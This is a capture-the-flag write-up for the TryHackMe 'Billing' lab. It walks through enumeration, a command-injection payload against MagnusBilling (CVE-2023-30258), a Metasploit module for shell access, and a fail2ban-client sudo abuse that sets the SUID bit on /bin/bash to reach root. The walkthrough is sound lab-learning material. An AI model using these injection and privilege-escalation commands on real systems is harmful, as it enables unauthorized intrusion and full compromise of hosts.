 # Billing Write-Up

## Index

- [Room Info and Challenge Description](#room-info-and-challenge-description)
- [Overview](#overview)
- [Attack Path Summary](#attack-path-summary)
- [Challenge Walkthrough](#challenge-walkthrough)
  - [Enumeration](#enumeration)
  - [Web / Service Enumeration](#web-service-enumeration)
  - [Vulnerability Identification](#vulnerability-identification)
  - [Initial Access](#initial-access)
  - [Post-Exploitation & Investigation](#post-exploitation-investigation)
  
- [Conclusion](#conclusion)

---

## Room Info and Challenge Description

**Platform:**  TryHackMe  
**Room:**  Billing  
**Difficulty:**  Easy  
**Link:**  [Room link](https://tryhackme.com/room/billing)  

**Description:**  
Some mistakes can be costly.

Gain a shell, find the way and escalate your privileges!

Note: Bruteforcing is out of scope for this room.

---

## Overview

- **Objective:**  Gain a shell and escalate privileges  
- **Target OS:**  Linux (Debian)
- **Attack Vector:**  MagnusBilling CVE, fail2ban misconfiguration

- **Tools Used:** (nmap, gobuster, metasploit)

---

## Attack Path Summary

High-level overview of the compromise chain.

> Find MagnusBilling CVE -> exploit and gain shell access -> check sudo privileges for current user -> exploit bad configuration in fail2ban binary -> get root access

---

## Challenge Walkthrough

### Enumeration

As most CTFs, the best idea is to start with enumeration using nmap. Here I did a simple scan for the well-known ports to find what known services are being ran.

```bash
nmap -p-1024  -sV -Pn -T4 -vv <TARGET_IP>
```

This was the result:

```bash
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 9.2p1 Debian 2+deb12u6 (protocol 2.0)
80/tcp open  http    syn-ack Apache httpd 2.4.62 ((Debian))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

So with this we can confirm it is a Linux system, using the Debian distro, and it has ssh open, and also an http server via Apache.

### Web Service Enumeration

Since there is a web server, I also used `gobuster` to enumerate to find any hidden files or directories of interest:

```bash
gobuster dir -u <TARGET_IP> -x txt,php,html -w Documents/enumerationDocs/big.txt -b 403,404
```

It only found `index.php` and `robots.txt`. Nothing of value.

### Vulnerability Identification

I started to investigate the technologies used on the web server. It uses an Apache 2.4.62 server and it also has a JavaScript framework: ExtJS 6.2.1. Both have known vulnerabilities, but none allow us to gain a shell.

In Firefox inspector I noticed that the GET request for the page has a number of fields. I also noticed a GET request to an URI that contains /authentication/check with a parameter that appears to be an ID.

After I realized that MagnusBilling was an actual real service and not a made up tryhackme name, I started searching and found [CVE-2023-30258](https://github.com/MarkLee131/awesome-web-pocs/blob/main/CVE-2023-30258.md)

This CVE allows OS command injection and after checking if it works with `http://<TARGET_IP>/mbilling/lib/icepay/icepay.php?democ=;sleep+5;`. It did, the page loaded after 5 seconds.

### Initial Access

To gain a shell I used Metasploit (the _linux/http/magnusbilling_unauth_rce_cve_2023_30258_ module) to gain access, upgraded to a shell with the `shell` command and ran `python3 -c 'import pty;pty.spawn("/bin/bash")'` to upgrade to a bash.

### Post Exploitation Investigation

Now with access to a shell, I navigated the directories to `/home` to try and get the first flag from a file named `user.txt`.

There were 3 users:

```bash
$ ls 		
ls
debian	magnus	ssm-user
```

I searched in the `magnus` folder and there it was. The first answer was the content of that file.

The next goal was to get the content of `root.txt` which meant gaining root access.

I used `sudo -l` to check the priviliges of my current user and got something interesting:

```bash
User asterisk may run the following commands on ip-<TARGET_IP>:
    (ALL) NOPASSWD: /usr/bin/fail2ban-client
```

I searched for this binary, and found that it is common to use it to escalate the privileges.

I found that I could add an action to set the `+s` privilege using this:

```bash
sudo /usr/bin/fail2ban-client set sshd addaction privesc
sudo /usr/bin/fail2ban-client set sshd action privesc actionban 'chmod +s /bin/bash'
sudo /usr/bin/fail2ban-client set sshd banip 127.0.0.1
/bin/bash -p
```

After executing this I got root access, used `find` to find it, and after finding it on the `root` folder I got its content which was the flag for the final question.

## Conclusion

This challenge included exploiting a CVE on a web service, the website login page was somewhat of a decoy, but the main vulnerability was with MagnusBilling. Exploiting it (using metasploit) gave me access to the system, and after checking the sudo permissions of my current user, I tried and got root access to complete the challenge. It was a fun challenge that involved common exploit techniques such as exploiting known vulnerabilities and linux binaries.
